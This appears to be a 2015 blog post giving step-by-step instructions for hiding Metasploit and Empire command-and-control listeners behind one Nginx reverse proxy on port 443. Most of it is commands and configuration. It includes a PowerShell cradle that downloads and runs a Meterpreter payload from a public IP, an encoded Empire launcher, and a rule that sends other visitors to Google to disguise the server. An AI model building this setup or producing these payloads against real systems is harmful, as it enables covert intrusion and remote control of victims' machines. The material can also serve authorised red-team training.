/*
Title: Reverse Proxy Attack Tools
*/

Posted: 2015-12-31

## Host Setup


### Install and stop Nginx
```
apt-get install nginx
service nginx stop
```


### Setup a virtual IP

Using 127.0.0.1 or 127.x.x.x with Metasploit isn't fun, feel free to skip this step if you wish to try it, but I've found it easier to just use a sub-interface:
```
ifconfig eth0:1 192.168.1.100 netmask 255.255.255.252
```

### Block port 2443

This port will be used for Empire and unfortunately at the current time, I haven't found a way to stop it listening globally
```
iptables -A INPUT -p tcp --destination-port 2443 -j DROP
```


I'll leave the Metasploit and Empire installs to the reader to accomplish, or maybe something else that will be put on to this wiki

## MSF Setup

I like to use `exploit/multi/script/web_delivery` because it means I don't have to generate a binary and I can deliver the payload over the same port it will be getting the call back on (yes, thats right folks, MSF has that part already built in)

This switches it from the default python shell type to PowerShell(PSH):

```
msf > use exploit/multi/script/web_delivery
msf exploit(web_delivery) > set TARGET 2
```

Our normal options (that is the public IP I used from Digital Ocean to test this scenario)
```
msf exploit(web_delivery) > set PAYLOAD windows/meterpreter/reverse_https
msf exploit(web_delivery) > set LPORT 443
msf exploit(web_delivery) > set LHOST 104.236.49.208
```
Setting up the web server for the delivery to be SSL on port 1443 on the local only 192.168.1.100 sub interface. It is important that you set a URIPATH, letting it stay random makes the Nginx config a bit more difficult
```
msf exploit(web_delivery) > set SSL true
msf exploit(web_delivery) > set SRVHOST 192.168.1.100
msf exploit(web_delivery) > set SRVPORT 1443
msf exploit(web_delivery) > set URIPATH /logoffbutton
```

Now we set the Handler to actually bind to the same IP and port as we put the web server on instead of the ones configured in LHOST and LPORT
```
msf exploit(web_delivery) > set ReverseListenerBindAddress 192.168.1.100
msf exploit(web_delivery) > set ReverseListenerBindPort 1443
```
And finally we override those options for the stager to be back to the real IP and port we want (without this setting the initial connection would come in but the code sent back to the host to run (stage) would be to 192.168.1.100
```
msf exploit(web_delivery) > set OverrideLHOST 104.236.49.208
msf exploit(web_delivery) > set OverrideLPORT 443
```

And if you did everything right you should get this:
```
[*] Started HTTPS reverse handler on https://192.168.1.100:1443/
[*] Using URL: https://192.168.1.100:1443/logoffbutton
[*] Server started.
[*] Run the following command on the target machine:
powershell.exe -nop -w hidden -c [System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true};$v=new-object net.webclient;$v.proxy=[Net.WebRequest]::GetSystemWebProxy();$v.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $v.downloadstring('https://104.236.49.208:1443/logoffbutton');
```
Copy and paste the powershell string for later, removing the `:1443` part.

## Empire Setup

Empire is a bit easier, but because it doesn't really have the options as Metasploit does, you have to jerry rig it a bit.



## Empire Payload Prep

Same as with MSF, we set up a listener like normal initially
```
(Empire) > listeners
(Empire: listeners) > set Name rev
(Empire: listeners) > set CertPath ../data/empire.pem
(Empire: listeners) > set Host https://104.236.49.208
(Empire: listeners) > set Port 2443
(Empire: listeners) > run
```
If you type `info` you will see that the listener appends the 2443 port :/ so we will need to
drop out of Empire and perform a small edit to the empire.db Sqlite3 database:

```
root@oneport:/opt/empire/data# sqlite3 empire.db
SQLite version 3.8.7.1 2014-10-29 13:59:56
Enter ".help" for usage hints
sqlite> update listeners set host='https://104.236.49.208' where name='rev';
sqlite> .q
root@oneport:/opt/empire/data# 
```

The reason we do this is because inside of Empire, if you switch the port option, it automatically gets appended to the host, no way that I've found to stop that, but it doesn't "fix" it the Sqlite edit.

Next, start Empire back up and we create our launcher (which will have the right config to work out of the box)

```
(Empire) > usestager launcher
(Empire: stager/launcher) > set Listener rev
(Empire: stager/launcher) > generate
powershell.exe -NoP -NonI -W Hidden -Enc JAB3AGMAPQBOAEUAVwAtAE8AYgBKAGUAYwBACAAUwBZAHMAdABlAG0ALgBOAEUAVAAuAFcAZQBiAEMATABJAEUATgB0ADsAJAB1AD0AJwBNAG8AegBAGwAbABhAC8ANQAuADAAIAAoAFcAaQBuAGQAbwB3AHMAIABOAFQAIAA2AC4AMQA7ACAAVwBPAFcANgAADsAIABUAHIAaQBkAGUAbgB0AC8ANwAuADAAOwAgAHIAdgA6ADEAMQAuADAAKQAgAGwAaQBrAGUAIABAGUAYwBrAG8AJwA7AFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAZQByAHQwAuAEgAZQBhAEQAZQBSAMALgBBAEQAZAAoACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnACwAJAB1ACkAOwAkAHcAYwAuAFAAcgBvAgAWQAgAD0AIABbAFMAeQBTAHQAZQBtAC4ATgBFAFQALgBXAEUAQgBSAGUAUQBVAEUAUwBUAF0AOgA6AQARQBmAGEAVQBsAHQAVwBFAEIAUAByAG8AeAB5ADsAJABXAEMALgBQAFIAbwBYAFkALgBDAFIAZGgAQByAFsAXQBdACgAJAB3AEMALgBEAE8AVwBOAEwATwBBAGQAUwBUAHIASQBOAEcAKAAiAGgAdAB0AHAAcA6AC8ALwAxADAANAAuADIAMwA2AC4ANAA5AC4AMgAwADgALwBpAG4AZABlAHgALgBhAHMAcAAiACkAKApAHwAJQB7ACQAXwAtAGIAWABvAFIAJABLAFsAJABpACsAKwAlACQAawAuAEwARQBuAGcAdABIAF0AfA7AEkARQBYACAAKAAkAGIALQBKAE8AaQBuACcAJwApAA==

```


## Nginx Setup

Replace the entire contents of `/etc/nginx/sites-available/default` with the following (comments are in line for each setting):
```
server {
        listen 443 ssl;
        ##
        # This is the only set of keys that matter,
        # if you want to set a valid cert, here is
        # where you would do it.
        ##
        ssl_certificate /tmp/server.crt;
        ssl_certificate_key /tmp/server.key;

		##
		# This makes sets what host header to answer
		# to, default means everything, can be useful
		# if you want to have more than one host
		# for each of your attack tools
		##
        server_name default;

        ##
        # Next 3 are the callback URLs for Empire
        ##

        location /admin/get.php {
                proxy_pass https://192.168.1.100:2443;
        }

        location /news.asp {
                proxy_pass https://192.168.1.100:2443;
        }

        location /login/process.jsp {
                proxy_pass https://192.168.1.100:2443;
        }

        ##
        # Stager URIs for Empire
        ##    
        location ~ ^/index\.(asp|php|jsp)$ {
                proxy_pass https://192.168.1.100:2443;
        }

        ##
        # Regular checkin regex (20 or more long URI with upper, lower and -_) ending in /
        ##
        location ~ "^/([a-zA-Z0-9\-\_]{20,})/$" {
                proxy_pass https://192.168.1.100:1443;
        }

        ##
        # Stage URI (5 characters, upper, lower, and -_) with no extension
        ##
        location ~ "^/([a-zA-Z0-9\-\_]{5})$" {
                proxy_pass https://192.168.1.100:1443;
        }

        ##
        #  Web Delivery URI, not required if not staged through web_delivery module
        ##
        location /logoffbutton {
                proxy_pass https://192.168.1.100:1443;
        }

        ##
        # Catch all to toss the rest at google
        ##
        location / {
                proxy_pass https://www.google.com;
        }
}
```

Start Nginx back up and you should be good to go
```
service nginx start
```
